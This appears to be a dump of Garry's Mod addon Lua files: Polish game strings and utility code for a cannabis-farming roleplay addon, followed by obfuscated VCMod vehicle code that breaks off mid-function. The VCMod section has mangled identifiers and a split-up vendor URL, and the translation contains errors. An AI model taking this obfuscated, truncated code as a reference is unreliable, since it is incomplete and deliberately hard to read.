    zwf.language.VGUI["Purchase"] = "Kup"
    zwf.language.VGUI["SellWeed"] = "Sprzedaj zioło"
    zwf.language.VGUI["Drop"] = "Wyrzuć"
    zwf.language.VGUI["Delete"] = "Usuń"
    zwf.language.VGUI["weedbuyer_title"] = "Kupiec zioła"
    zwf.language.VGUI["seedbank_title"] = "Bank nasion"
    zwf.language.VGUI["Strain"] = "Odcedź"
    zwf.language.VGUI["Duration"] = "Czas wzrostu"
    zwf.language.VGUI["Difficulty"] = "Poziom trudności"
    zwf.language.VGUI["HarvestAmount"] = "Podstawowa waga zbiorów"
    zwf.language.VGUI["THCBoost"] = "Wzmocnienie THC"
    zwf.language.VGUI["GrowTimeBoost"] = "Wzmocnienie czasu wzrostu"
    zwf.language.VGUI["GrowAmountBoost"] = "Wzmocnienie ilości zioła"
    zwf.language.VGUI["THCBoost"] = "Wzmocnienie THC"
    zwf.language.VGUI["SeedCount"] = "Ilość nasion"
    zwf.language.VGUI["PowerUsage"] = "Zużycie mocy"
    zwf.language.VGUI["HeatProduction"] = "Wytwarzane ciepło"
    zwf.language.VGUI["Ranks"] = "Dostępne dla"
    zwf.language.VGUI["SeedName"] = "Nazwa nasiona"




    zwf.language.NPC["title"] = "Kupiec marihuany"
    zwf.language.NPC["profit"] = "Bonus"
    zwf.language.NPC["interact_fail"] = "Zjeżdżaj stąd!"
    zwf.language.NPC["interact_noweed"] = "Wróć do mnie jak już coś wyprodukujesz, Ty bezużyteczny kmieciu!"


    zwf.language.Shop["title"] = "Deepweb"

    zwf.language.Shop["category_Equipment"] = "Sprzęt"

    zwf.language.Shop["item_generator_title"] = "Generator"
    zwf.language.Shop["item_generator_desc"] = "Generuje moc przy użyciu paliwa."

    zwf.language.Shop["item_fuel_title"] = "Kanister z paliwem"
    zwf.language.Shop["item_fuel_desc"] = "Paliwo do generatora."

    zwf.language.Shop["item_lamp01_desc"] = "Zapewnia światło dla roślin, zwiększając ich temperaturę."
    zwf.language.Shop["item_lamp02_desc"] = "Zapewnia światło dla roślin, nie zwiększając ich temperatury."

    zwf.language.Shop["item_ventilator_title"] = "Wentylator"
    zwf.language.Shop["item_ventilator_desc"] = "Zmniejsza temperaturę roślin."

    zwf.language.Shop["item_outlet_title"] = "Listwa zasilająca"
    zwf.language.Shop["item_outlet_desc"] = "Pozwala podłączyć więcej urządzeń."

    zwf.language.Shop["item_flowerpot01_title"] = "Doniczka"
    zwf.language.Shop["item_flowerpot01_desc"] = "Zwykła doniczka."

    zwf.language.Shop["item_flowerpot02_title"] = "Doniczka Premium"
    zwf.language.Shop["item_flowerpot02_desc"] = "Unikalna doniczka, automatycznie pobiera wodę ze zbiornika w odpowiednich proporcjach."

    zwf.language.Shop["item_soil_title"] = "Worek z ziemią"
    zwf.language.Shop["item_soil_desc"] = "Podłoże dla roślin doniczkowych."

    zwf.language.Shop["item_watertank_title"] = "Zbiornik z wodą"
    zwf.language.Shop["item_watertank_desc"] = "Przechowuje wodę pozwalając nawodnić doniczki."

    zwf.language.Shop["item_drystation_title"] = "Stoisko do suszenia"
    zwf.language.Shop["item_drystation_desc"] = "Służy do suszenia ściętych łogdyg konopii"

    zwf.language.Shop["item_packingtable_title"] = "Stoisko do pakowania"
    zwf.language.Shop["item_packingtable_desc"] = "Służy do pakowania zioła w pudełeka."

    zwf.language.Shop["item_autopacker_title"] = "Automatyczny pakowacz"
    zwf.language.Shop["item_autopacker_desc"] = "Po zainstalowaniu w stoisku, automatyzuje proces pakowania marihuany oszczędzając Ci czasu i wysiłku, przelanych łez i kropli potu."

    zwf.language.Shop["item_seedlab_title"] = "Labolatorium"
    zwf.language.Shop["item_seedlab_desc"] = "Pozwala Ci stworzyć nowe rodaje nasion, wykorzystując słoiczki z ziołem."

    zwf.language.Shop["item_seedbank_title"] = "Bank nasion"
    zwf.language.Shop["item_seedbank_desc"] = "Pozwala przechowywać nasiona na późniejszy okres."

    zwf.language.Shop["item_palette_title"] = "Paleta"
    zwf.language.Shop["item_palette_desc"] = "Przeznaczona do transportu zapakowanego zioła."


    zwf.language.Shop["item_seed01_desc"] = "OG Kush to legendarna odmiana o nazwie, która cieszy się uznaniem nawet poza światem konopi."
    zwf.language.Shop["item_seed02_desc"] = "Bubba Kush to ciężka hybryda dwóch sławnych nasion, która cieszy się bardzo dużą popularnością."
    zwf.language.Shop["item_seed03_desc"] = "Sour Diesel zasilany jest energią i dodatnim poziomem, sprawia, że ​​łatwo zauważyć, dlaczego szczep cieszy się popularnością w Stanach Zjednoczonych."
    zwf.language.Shop["item_seed04_desc"] = "AK-47 to hybryda z dominujcym naciskiem na jasną biel."
    zwf.language.Shop["item_seed05_desc"] = "Super Lemon Haze łączy słodycz i cierpkość."
    zwf.language.Shop["item_seed06_desc"] = "Strawberry Caugh to wzmacniająca, skoncentrowana na smaku hybryda."
    zwf.language.Shop["item_seed07_desc"] = "Purpurowa charakterystyka tego szczepu jest odziedziczona po przodkach z regionu Chitral w Pakistańskim Hindu Kush."

    zwf.language.Shop["category_Nutritions"] = "Nawóz"

    zwf.language.Shop["item_nutrition01_desc"] = "Nieznacznie zwiększa prędkość fazy wzrostu rośliny."
    zwf.language.Shop["item_nutrition02_desc"] = "Znacząco zwiększa prędkość fazy wzrostu rośliny."
    zwf.language.Shop["item_nutrition03_desc"] = "Nieznacznie zwiększa ilość wyprodukowanego zioła."
    zwf.language.Shop["item_nutrition04_desc"] = "Znacząco zwiększa ilość wyprodukowanego zioła."
    zwf.language.Shop["item_nutrition05_desc"] = "Nieznacznie zwiększa prędkość wzrostu, jak i ilość wyprodukowanego zioła."
    zwf.language.Shop["item_nutrition06_desc"] = "Znacznie zwiększa prędkość wzrostu, jak i ilość wyprodukowanego zioła."

    zwf.language.Shop["category_Seeds"] = "Nasiona"

    // Joint UPDATE
    zwf.language.General["joint_pickup_fail"] = "Już posiadasz jointa!"
    zwf.language.General["JointSharingFail"] = "Gracz $PlayerName posiada już jointa!"

    zwf.language.NPC["question_01"] = "Czego chcesz?"
    zwf.language.NPC["question_01_answer01"] = "Chciałbym zakupić bongo"
    zwf.language.NPC["question_01_answer02"] = "Mam trochę trawki dla Ciebie"
    zwf.language.NPC["question_01_answer03"] = "W sumie nic"

    zwf.language.NPC["question_02"] = "Który wpadł Ci w oko? Wybieraj."
    zwf.language.NPC["question_02_answer01"] = "Wróć" // This is the Back button on the NPC BongShop interface

end

--PATH addons/zeros_weedfarm/lua/zweedfarm/sh/zwf_utility.lua:
zwf = zwf or {}
zwf.f = zwf.f or {}

if SERVER then

	// Basic notify function
	function zwf.f.Notify(ply, msg, ntfType)
		if DarkRP and DarkRP.notify then
			DarkRP.notify(ply, ntfType, 8, msg)
		else
			ply:ChatPrint(msg)
		end
	end
end

if (CLIENT) then

	function zwf.f.LerpColor(t, c1, c2)
		local c3 = Color(0, 0, 0)
		c3.r = Lerp(t, c1.r, c2.r)
		c3.g = Lerp(t, c1.g, c2.g)
		c3.b = Lerp(t, c1.b, c2.b)
		c3.a = Lerp(t, c1.a, c2.a)

		return c3
	end

	function zwf.f.GetFontFromTextSize(str,len,font01,font02)
		local size = string.len(str)
		if size < len then
			return font01
		else
			return font02
		end
	end

	// Checks if the entity did not got drawn for certain amount of time and call update functions for visuals
	function zwf.f.UpdateEntityVisuals(ent)
		if zwf.f.InDistance(LocalPlayer():GetPos(), ent:GetPos(), 1000) then

			local curDraw = CurTime()

			if ent.LastDraw == nil then
				ent.LastDraw = CurTime()
			end

			if ent.LastDraw < (curDraw - 1) then
				//print("Entity: " .. ent:EntIndex() .. " , Call UpdateVisuals() at " .. math.Round(CurTime()))

				ent:UpdateVisuals()
			end

			ent.LastDraw = curDraw
		end
	end

	function zwf.f.LoopedSound(ent, soundfile, shouldplay)
		if shouldplay and zwf.f.InDistance(LocalPlayer():GetPos(), ent:GetPos(), 500) then
			if ent.Sounds == nil then
				ent.Sounds = {}
			end

			if ent.Sounds[soundfile] == nil then
				ent.Sounds[soundfile] = CreateSound(ent, soundfile)
			end

			if ent.Sounds[soundfile]:IsPlaying() == false then
				ent.Sounds[soundfile]:Play()
				ent.Sounds[soundfile]:ChangeVolume(1, 0)
			end
		else
			if ent.Sounds == nil then
				ent.Sounds = {}
			end

			if ent.Sounds[soundfile] ~= nil and ent.Sounds[soundfile]:IsPlaying() == true then
				ent.Sounds[soundfile]:ChangeVolume(0, 0)
				ent.Sounds[soundfile]:Stop()
				ent.Sounds[soundfile] = nil
			end
		end
	end

	function zwf.f.StopLoopedSound(ent)
		if IsValid(ent) and ent.Sounds and istable(ent.Sounds) and table.Count(ent.Sounds) > 0 then
			for k, v in pairs(ent.Sounds) do
				if v and v:IsPlaying() then
					v:Stop()
				end
			end
		end
	end
end


////////////////////////////////////////////
////////////////// Util ////////////////////
////////////////////////////////////////////

//Used to fix the Duplication Glitch
function zwf.f.CollisionCooldown(ent)
	if ent.zwf_CollisionCooldown == nil then
		ent.zwf_CollisionCooldown = true

		timer.Simple(0.1,function()
			if IsValid(ent) then
				ent.zwf_CollisionCooldown = false
			end
		end)

		return false
	else
		if ent.zwf_CollisionCooldown then
			return true
		else
			ent.zwf_CollisionCooldown = true

			timer.Simple(0.1,function()
				if IsValid(ent) then
					ent.zwf_CollisionCooldown = false
				end
			end)
			return false
		end
	end
end

// Here we check if the string has invalid characts
function zwf.f.String_ValidCharacter(aString)
	local str = string.gsub( aString, " ", "" )
	local Valid = true

	if string.match(str, "%W", 1) then
		Valid = false
	end

	return Valid
end

function zwf.f.String_TooShort(aString,size)
	local str = string.gsub( aString, " ", "" )
	local _TooShort = false

	if string.len(str) <= size then
		_TooShort = true
	end

	return _TooShort
end

function zwf.f.String_TooLong(aString,size)
	local str = string.gsub( aString, " ", "" )
	local _TooLong = false

	if string.len(str) > size then
		_TooLong = true
	end

	return _TooLong
end

// Checks if the distance between pos01 and pos02 is smaller then dist
function zwf.f.InDistance(pos01, pos02, dist)
	local inDistance = pos01:DistToSqr(pos02) < (dist * dist)
	return  inDistance
end

function zwf.f.RandomChance(chance)
	if math.random(0, 100) < math.Clamp(chance,0,100) then
		return true
	else
		return false
	end
end

function zwf.f.table_randomize( t )
	local out = { }

	while #t > 0 do
		table.insert( out, table.remove( t, math.random( #t ) ) )
	end

	return out
end

function zwf.f.Calculate_AmountCap(hAmount, cap)
	local sAmount

	if hAmount > cap then
		sAmount = cap
	else
		sAmount = hAmount
	end

	return sAmount
end

// Tells us if the functions is valid
function zwf.f.FunctionValidater(func)
	if (type(func) == "function") then return true end
	// 263617085
	return false
end

function zwf.f.TableKeyToString(tbl)
	local str = ""

	for k, v in pairs(tbl) do
		if v then
			str = str .. tostring(k) .. ", "
		end
	end

	return str
end
////////////////////////////////////////////
////////////////////////////////////////////



////////////////////////////////////////////
///////////////// Timer ////////////////////
////////////////////////////////////////////
concommand.Add("zwf_debug_Timer_PrintAll", function(ply, cmd, args)
	if zwf.f.IsAdmin(ply) then
		zwf.f.Timer_PrintAll()
	end
end)

if zwf_TimerList == nil then
	zwf_TimerList = {}
end

function zwf.f.Timer_PrintAll()
	PrintTable(zwf_TimerList)
end

function zwf.f.Timer_Create(timerid,time,rep,func)
	if zwf.f.FunctionValidater(func) then
		timer.Create(timerid, time, rep,func)
		table.insert(zwf_TimerList, timerid)
	end
end

function zwf.f.Timer_Remove(timerid)
	if timer.Exists(timerid) then
		timer.Remove(timerid)
		table.RemoveByValue(zwf_TimerList, timerid)
	end
end
////////////////////////////////////////////
////////////////////////////////////////////



////////////////////////////////////////////
///////////////// OWNER ////////////////////
////////////////////////////////////////////

if SERVER then
	// This saves the owners SteamID
	function zwf.f.SetOwnerByID(ent, id)
		ent:SetNW2String("zwf_Owner", id)
	end

	// This saves the owners SteamID
	function zwf.f.SetOwner(ent, ply)
		if (IsValid(ply)) then
			ent:SetNW2String("zwf_Owner", ply:SteamID())

			if CPPI then
				ent:CPPISetOwner(ply)
			end
		else
			ent:SetNW2String("zwf_Owner", "world")
		end
	end
end

// This returns the entites owner SteamID
function zwf.f.GetOwnerID(ent)
	return ent:GetNW2String("zwf_Owner", "nil")
end

// Checks if both entities have the same owner
function zwf.f.OwnerID_Check(ent01,ent02)

	if IsValid(ent01) and IsValid(ent02) then

		if zwf.f.GetOwnerID(ent01) == zwf.f.GetOwnerID(ent02) then
			return true
		else
			return false
		end
	else
		return false
	end
end

// This returns the owner
function zwf.f.GetOwner(ent)
	if IsValid(ent) then
		local id = ent:GetNW2String("zwf_Owner", "nil")
		local ply = player.GetBySteamID(id)

		if (IsValid(ply)) then
			return ply
		else
			return false
		end
	else
		return false
	end
end

// Checks if the player is the owner of the entitiy
function zwf.f.IsOwner(ply, ent)
	if IsValid(ent) and IsValid(ply) then
		local id = ent:GetNW2String("zwf_Owner", "nil")
		local ply_id = ply:SteamID()

		if id == ply_id or id == "world" then

			return true
		else
			return false
		end
	else
		return false
	end
end

// Checks if the player is the owner of the plant
function zwf.f.IsPlantOwner(ply, plant)
	if zwf.config.Sharing.Plants then
		return true
	else

		return zwf.f.IsOwner(ply, plant)
	end
end

// Checks if the player is the owner of the seed
function zwf.f.IsSeedOwner(ply, seed)
	if zwf.config.Sharing.Seeds then
		return true
	else

		return zwf.f.IsOwner(ply, seed)
	end
end

// Checks if the player is the owner of the packingtable
function zwf.f.IsPackingTableOwner(ply, packingtable)
	if zwf.config.Sharing.Packing then
		return true
	else

		return zwf.f.IsOwner(ply, packingtable)
	end
end

// This returns true if the player is a admin
function zwf.f.IsAdmin(ply)
	if IsValid(ply) then

		//xAdmin Support
		if xAdmin then

			return ply:IsAdmin()

		// SAM Support
		elseif sam then
			return ply:IsAdmin()
		else
			if zwf.config.AdminRanks[zwf.f.GetPlayerRank(ply)] then
				return true
			else
				return false
			end
		end
	else
		return false
	end
end
////////////////////////////////////////////
////////////////////////////////////////////



////////////////////////////////////////////
////////////// Rank / Job //////////////////
////////////////////////////////////////////
// Returns the player rank / usergroup
function zwf.f.GetPlayerRank(ply)
	if SG then
		return ply:GetSecondaryUserGroup() or ply:GetUserGroup()
	else
		return ply:GetUserGroup()
	end
end

function zwf.f.PlayerRankCheck(ply,ranks)
	if xAdmin then

		local HasRank = false
		for k, v in pairs(ranks) do
			if ply:IsUserGroup(k) then
				HasRank = true
				break
			end
		end
		return HasRank
	else
		if ranks[zwf.f.GetPlayerRank(ply)] == nil then
			return false
		else
			return true
		end
	end
end

// Returns the players job
function zwf.f.GetPlayerJob(ply)
	return ply:Team()
end

// Returns the players job name
function zwf.f.GetPlayerJobName(ply)
	return team.GetName( zwf.f.GetPlayerJob(ply) )
end
////////////////////////////////////////////
////////////////////////////////////////////



////////////////////////////////////////////
//////////////// CUSTOM ////////////////////
////////////////////////////////////////////
// Checks if the player is allowed to sell weed
function zwf.f.IsWeedSeller(ply)
	if table.Count(zwf.config.Jobs) > 0 then
		if zwf.config.Jobs[zwf.f.GetPlayerJob(ply)] then
			return true
		else
			if SERVER then
				zwf.f.Notify(ply, zwf.language.General["WrongJob"], 1)
			end
			return false
		end
	else
		return true
	end
end

// Checks if the player is allowed to buy a bong
function zwf.f.CanBuyBongs(ply)
	if table.Count(zwf.config.NPC.Customers) > 0 then
		if zwf.config.NPC.Customers[zwf.f.GetPlayerJob(ply)] then
			return true
		else
			return false
		end
	else
		return true
	end
end
////////////////////////////////////////////
////////////////////////////////////////////

--PATH vcmod??init_shared:
VC["Ho".."st"] = "ht".."tps"..":/".."/vcm".."od.".."org/"   if !VC.Loaded then VC.Loaded = {} end local id = "shared" if VC.Loaded[id] then return end VC.Loaded[id] = CurTime()  file.CreateDir("vcmod") file.CreateDir("vcmod/data_lng")      if !VC.Settings then VC.Settings = {} end if !VC.Settings_Defaults then VC.Settings_Defaults = {} end  if !VC.ServerSettings then VC.ServerSettings = {} end if !VC.ServerSettings_Defaults then VC.ServerSettings_Defaults = {} end   if !VC.ServerSettings_Index then VC.ServerSettings_Index = {from = {}, to = {}} end  local function handleIndexing(def, new)  for k,v in pairs(new) do  if !VC.ServerSettings_Index.to[k] then  local index = table.Count(VC.ServerSettings_Index.to)+1  VC.ServerSettings_Index.from[index] = k  VC.ServerSettings_Index.to[k] = index  end  end end  function VC.SettingFromIndex(val) return VC.ServerSettings_Index.from[val] or 0 end function VC.SettingToIndex(val) return VC.ServerSettings_Index.to[val] or 0 end  function VC.SettingsAdd(val, isShared)  if !isShared or SERVER then  table.Merge(VC.Settings_Defaults, val)  end  if isShared then  table.Merge(VC.ServerSettings_Defaults, val)  handleIndexing(VC.ServerSettings_Defaults, val)  end end  function VC.getSetting(id, default)  local ret = default  local new = VC.Settings[id]  if new != nil then ret = new end  return ret end  function VC.getServerSetting(id, default)  local ret = default  local new = VC.ServerSettings[id]  if new != nil then ret = new end  return ret end      function VC.isVCModCompatible(ent)  return ent.VC_IsNotPrisonerPod or !IsValid(ent:GetParent()) or ent.VC_ExtraSeat end  local dir = "vcmod/languages" if file.Exists(dir, "DATA") then for k,v in pairs(file.Find(dir.."/*", "DATA")) do file.Delete(dir.."/"..v) end end file.Delete(dir) local dir = "vcmod/lng" if file.Exists(dir, "DATA") then for k,v in pairs(file.Find(dir.."/*", "DATA")) do file.Delete(dir.."/"..v) end end file.Delete(dir)  if !VC_TgX3e18505c6fdde124627e9fa198ee180bUTy then VC_TgX3e18505c6fdde124627e9fa198ee180bUTy = {} end  VC.Include("vcmod/shared/various_all.lua") VC.Include("vcmod/shared/metadata.lua") VC.Include("vcmod/shared/functions_util.lua") VC.Include("vcmod/shared/core_sf.lua") VC.Include("vcmod/shared/overrides.lua") VC.Include("vcmod/shared/compatibility.lua") VC.Include("vcmod/shared/settings_sf.lua")  if SERVER then  VC.Include("vcmod/server/main_all.lua")  VC.Include("vcmod/server/main_shared_sf.lua")   VC.Include("vcmod/server/entcode_main.lua") else  net.Receive("VC_SendToClient_Options_Public", function()  local settings, priv = net.ReadTable(), net.ReadInt(4)  if settings then  for k,v in pairs(settings) do  local key = VC.SettingFromIndex(k)  VC.ServerSettings[key] = v  end  end   VC.PrivilegesLevel = priv  end)   net.Receive("VC_SendToClient_Override_Controls", function() VC.Override_Controls = net.ReadTable() if VC.Menu_Panel then VC.Menu_Panel.VC_Refresh_Panel = true end end)   VC.Include("vcmod/client/main_all.lua")   VC.Include("vcmod/client/data_gui.lua")  VC.Include("vcmod/client/data_menu_shared.lua")  VC.Include("vcmod/client/data_menu_sf.lua")   VC.Include("vcmod/client/main_shared_sf.lua")  VC.Include("vcmod/client/anim_shared.lua")  VC.Include("vcmod/client/init_object.lua")   VC.Include("vcmod/client/input.lua")  VC.Include("vcmod/client/hud.lua")     VC.Include("vcmod/client/menu.lua")  VC.Include("vcmod/client/language_init.lua")  VC.Include("vcmod/client/language_main.lua")   VC.Include("vcmod/client/data_hud.lua")   VC.Include("vcmod/client/hud_pdtr.lua")  VC.Include("vcmod/client/entcode_main.lua")   VC.Include("vcmod/client/audio.lua")  VC.Include("vcmod/client/states_shared.lua") end local rs7 = "vc.check_msg_work_ALS_k4" 
--PATH vcmod??core_sf:
if !VC.CD then VC.CD = {} end if !VC.RM then VC.RM = {} end  if !VC.CodeEnt then VC.CodeEnt = {} end      VC.States = {} VC.StatesByID = {}  function VC.StateAdd(id_state, id, funcOn, funcOff, allowedFront)  local tbl = {id_state = id_state, id = id, funcOn = funcOn, funcOff = funcOff, allowedFront = allowedFront}  VC.States[id_state] = tbl VC.StatesByID[id] = tbl end  local function handleSound(ent, snd, state)  if snd then  local click = snd[1] == "c" if click then snd[1] = "Clk" end  VC.SoundEmit(ent, snd[1], click and (state and 105 or 95) or snd[2], snd[3], snd[4])  end end  function VC.SetStateBool(ent, id, state, send_to, avoid, private, snd)  if !ent.VC_States then ent.VC_States = {} end   local opt = nil if state then opt = true end  if hook.Call("VC_canChangeState", GAMEMODE, ent, id, opt, ent.VC_States[id], avoid) == false then return end   ent.VC_States[id] = opt   if SERVER then  net.Start("VC_SetStateBool") net.WriteEntity(ent) net.WriteString(id) net.WriteBool(opt or false) net.WriteTable(snd or {}) if avoid then net.SendOmit(avoid) else if send_to then net.Send(send_to) else net.Broadcast() end end  else  handleSound(ent, snd, state)   if !private then  net.Start("VC_SetStateBool") net.WriteString(id) net.WriteBool(opt) net.WriteTable(snd or {}) net.SendToServer()  end  end end  function VC.SetStateInt(ent, id, state, send_to, avoid, private, snd)  if !ent.VC_States then ent.VC_States = {} end   local opt = nil if state then opt = state end  if hook.Call("VC_canChangeState", GAMEMODE, ent, id, opt, ent.VC_States[id], avoid) == false then return end   ent.VC_States[id] = opt   if SERVER then  net.Start("VC_SetStateInt") net.WriteEntity(ent) net.WriteString(id) net.WriteInt(opt or 0, 8) net.WriteTable(snd or {}) if avoid then net.SendOmit(avoid) else if send_to then net.Send(send_to) else net.Broadcast() end end  else  handleSound(ent, snd, state)   if !private then  net.Start("VC_SetStateInt") net.WriteString(id) net.WriteInt(opt or 0, 8) net.WriteTable(snd or {}) net.SendToServer()  end  end end  function VC.GetState(ent, id, default)  local ret = default or nil   if ent.VC_States then local opt = ent.VC_States[id] if opt then ret = opt end end   return ret end    VC.StateAdd("HornOn", "Horn", "HornOn", "HornOff")  function VC.HornOn(ent, silent, caller)  if VC.getServerSetting("Horn_Enabled") and !VC.GetState(ent, "HornOn") and ent.VC_IsNotPrisonerPod and !VC_asi3e18505c6fdde124627e9fa198ee180bAa3S(ent).NoHorn then  VC.SetStateBool(ent, "HornOn", true, nil, caller)   if VC.IndicationCheck then VC.IndicationCheck(ent, "horn", true) end  return true  end end function VC.HornOff(ent, silent, caller)  if VC.GetState(ent, "HornOn") then  VC.SetStateBool(ent, "HornOn", false, nil, caller)   if VC.IndicationCheck then VC.IndicationCheck(ent, "horn", false) end  return true  end end      hook.Add("Think", "VC_Think", function()  if !VC.getSetting("Enabled") then return end   local Slow_Extra = !VC.Think_Slow_Extra_Time or CurTime() >= VC.Think_Slow_Extra_Time  local time_1 = !VC.Think_1_Time or CurTime() >= VC.Think_1_Time  local time_05 = !VC.Think_05_Time or CurTime() >= VC.Think_05_Time  local Slow = !VC.Think_Slow_Time or CurTime() >= VC.Think_Slow_Time  local Medium = !VC.Think_Medium_Time or CurTime() >= VC.Think_Medium_Time  local Fast = !VC.Think_Fast_Time or CurTime() >= VC.Think_Fast_Time   if time_1 and VC.Think_time_1 then VC.Think_time_1() end    if Slow_Extra and VC.Think_Slow_Extra then VC.Think_Slow_Extra() end  if Slow and VC.Think_Slow then VC.Think_Slow() end  if Medium and VC.Think_Medium then VC.Think_Medium() end  if Fast and VC.Think_Fast then VC.Think_Fast() end  if VC.Think_Instant then VC.Think_Instant() end     if VC.Think_Instant_PerPlayer then  for k,ply in pairs(player.GetAll()) do  VC.Think_Instant_PerPlayer(ply)  end  end   for EntLN, ent in pairs(VC.GetVehicleList()) do   if IsValid(ent) and (CLIENT or IsValid(ent:GetPhysicsObject())) then  ent.VC_VelLength = ent:GetVelocity():Length() ent.VC_Speed_Forward = ent:GetVelocity():Dot(ent:GetForward())            local Drv = SERVER and ent:GetDriver() if !IsValid(Drv) or !Drv:IsPlayer() then Drv = nil end   VC.Initialize_Basic(ent)  if SERVER and !ent.VC_Initialized then VC_dyi3e18505c6fdde124627e9fa198ee180bXygHe(ent) end   if Slow_Extra and VC.Think_Slow_Extra_Each then VC.Think_Slow_Extra_Each(ent, EntLN, Drv) end  if time_05 and VC.Think_Each_time_05 then VC.Think_Each_time_05(ent, EntLN, Drv) end  if Slow then  if VC.Think_Slow_Each_All then VC.Think_Slow_Each_All(ent, EntLN, Drv) end  if VC.Think_Slow_Each_Main then VC.Think_Slow_Each_Main(ent, EntLN, Drv) end  if VC.Think_Slow_Each_ELS then VC.Think_Slow_Each_ELS(ent, EntLN, Drv) end  end            if Fast and VC.Think_Fast_Each then VC.Think_Fast_Each(ent, EntLN, Drv) end  if VC.AI_Think_Each_Instant then VC.AI_Think_Each_Instant(ent, EntLN, Drv) end  if VC.Think_Each_Instant then VC.Think_Each_Instant(ent, EntLN, Drv) end  end  end   if Slow_Extra then VC.Think_Slow_Extra_Time = CurTime()+5 end  if time_1 then VC.Think_1_Time = CurTime()+1 end  if time_05 then VC.Think_05_Time = CurTime()+0.5 end  if Slow then VC.Think_Slow_Time = CurTime()+0.2 end  if Slow then VC.Think_Slow_Time = CurTime()+0.2 end  if Medium then VC.Think_Medium_Time = CurTime()+0.1 end  if Fast then VC.Think_Fast_Time = CurTime()+0.05 end end)       function VC.GetTLTTR_Info(ent) return ent.VC_TLTTR_BInfo or 1 end    VC.Entities = {} function VC.unregisterEntity(ent, key)  if ent.VC_Entities then  if ent.VC_Entities[key] then  if IsValid(ent.VC_Entities[key]) then ent.VC_Entities[key]:Remove() end  ent.VC_Entities[key] = nil  end  end end  function VC_UHp3e18505c6fdde124627e9fa198ee180blJ(ent, prt, key, lifetime)    if !prt.VC_Entities then prt.VC_Entities = {} end  if key then prt.VC_Entities[key] = ent else table.insert(prt.VC_Entities, ent) end     if lifetime then timer.Simple(lifetime, function() if IsValid(ent) then ent:Remove() end end) end end  function VC.clearEntity(ent)  if ent.VC_Sounds then for k,v in pairs(ent.VC_Sounds) do v:Stop() end end  if ent.VC_Entities then for k,v in pairs(ent.VC_Entities) do if IsValid(v) then v:Remove() end end end end  hook.Add("EntityRemoved", "VC_Removed", function(ent)  if ent.VC_CD_DataNeedsUpdatingTime then ent.VC_CD_DataNeedsUpdatingTime = CurTime() VC.HandleCarDealer_Slow(ent) end     if ent:IsVehicle() then  local ply = ent:GetDriver()  if IsValid(ply) then  ply.VC_ChnSts = false  end  end   VC.clearEntity(ent) end)  function VC.ApplyEntityParams(from, to)  local bgroup_str = "" for k,v in pairs(from:GetBodyGroups()) do bgroup_str = bgroup_str..from:GetBodygroup(v.id) end to:SetBodyGroups(bgroup_str)  to:SetSkin(from:GetSkin())  to:SetColor(from:GetColor()) end  function VC.Initialize_Basic(ent)  if ent.VC_InitializedBasic then return end ent.VC_InitializedBasic = true  if !VC.GetTLTTR_Info then return end   if !IsValid(ent) then return end   ent.VC_Sounds = {}   ent.VC_Class = string.lower(ent:GetClass())  ent.VC_isSupported = VC.classIsSupported(ent.VC_Class)  ent.VC_IsJeep = ent.VC_Class == "prop_vehicle_jeep"  ent.VC_IsPrisonerPod = ent.VC_Class == "prop_vehicle_prisoner_pod"  ent.VC_IsNotPrisonerPod = !ent.VC_IsPrisonerPod   ent.VC_IsAirboat = ent.VC_Class == "prop_vehicle_airboat"  ent.VC_ExtraSeat = ent.VC_IsPrisonerPod and ent:GetNWBool("VC_ExtraSeat", false)    if ent.VC_ExtraSeat then  ent.VC_View_TP_Radius = math.Max(200, ent:BoundingRadius())  end   if VC.Initialize_Basic_Stage2 then VC.Initialize_Basic_Stage2(ent) end end  function VC_FwR3e18505c6fdde124627e9fa198ee180bYaAzk(Tbl)  local Vec = nil  if Tbl.SpecMLine and Tbl.SpecMLine.Use and Tbl.SpecMLine.LTbl then  if Tbl.RenderMLCenter then  local tpos = Tbl.Pos for k,v in pairs(Tbl.SpecMLine.LTbl) do tpos = tpos+ (v and v.Pos or Tbl.Pos) end Vec = tpos/(#Tbl.SpecMLine.LTbl+1)  else  local ttbl = Tbl.SpecMLine.LTbl[math.floor((1+#Tbl.SpecMLine.LTbl)/2)] Vec = ttbl and ttbl.Pos or Tbl.Pos  end  elseif Tbl.SpecRec and Tbl.SpecRec.Use then  Vec = ((Tbl.SpecRec.Pos1 or Vector(0,0,0))+(Tbl.SpecRec.Pos2 or Vector(0,0,0))+(Tbl.SpecRec.Pos3 or Vector(0,0,0))+(Tbl.SpecRec.Pos4 or Vector(0,0,0)))/4  end  return Vec end  function VC_Esq3e18505c6fdde124627e9fa198ee180bZ0w(Tbl)  local LTbl = {}  if Tbl.Siren and Tbl.Siren.Lights then for Lhtk, Lt in pairs(Tbl.Siren.Lights) do Tbl.Siren.Lights[Lhtk].SLSPos = VC_FwR3e18505c6fdde124627e9fa198ee180bYaAzk(Lt) end end  if Tbl.Lights then  for Lhtk, Lt in pairs(Tbl.Lights) do Tbl.Lights[Lhtk].SLSPos = VC_FwR3e18505c6fdde124627e9fa198ee180bYaAzk(Lt) end  for Lhtk, Lt in pairs(Tbl.Lights) do  if Lt.BrakeColor and Lt.UseBrake then if !LTbl.Brake then LTbl.Brake = {} end LTbl.Brake[Lhtk] = Lt end  if Lt.ReverseColor and Lt.UseReverse then if !LTbl.Reverse then LTbl.Reverse = {} end LTbl.Reverse[Lhtk] = Lt end  if Lt.HeadColor and Lt.UseHead then Lt.HBeamColor = Lt.HeadColor Lt.UseHighBeams = true Lt.LBeamColor = Lt.HeadColor Lt.UseLowBeams = true  Lt.HeadColor = nil Lt.UseHead = nil end  if Lt.HBeamColor and Lt.UseHighBeams then if !LTbl.HBeam then LTbl.HBeam = {} end LTbl.HBeam[Lhtk] = Lt end  if Lt.LBeamColor and Lt.UseLowBeams then if !LTbl.LBeam then LTbl.LBeam = {} end LTbl.LBeam[Lhtk] = Lt end  if Lt.RunningColor and Lt.UseRunning then if !LTbl.Running then LTbl.Running = {} end LTbl.Running[Lhtk] = Lt end  if Lt.BlinkersColor and Lt.UseBlinkers then if !LTbl.Blinker then LTbl.Blinker = {} end LTbl.Blinker[Lhtk] = Lt end  if Lt.SirenColor and Lt.UseSiren then if !LTbl.Siren then LTbl.Siren = {} end LTbl.Siren[Lhtk] = Lt end  if Lt.FogColor and Lt.UseFog then if !LTbl.Fog then LTbl.Fog = {} end LTbl.Fog[Lhtk] = Lt end  if Lt.InterColor and Lt.UseInter then if !LTbl.Inter then LTbl.Inter = {} end LTbl.Inter[Lhtk] = Lt end  end  end  return LTbl end  function VC.getName(ent, default)  local ret = nil   if IsValid(ent) then  if SERVER then  ret = ent.VC_Name  else  local data = 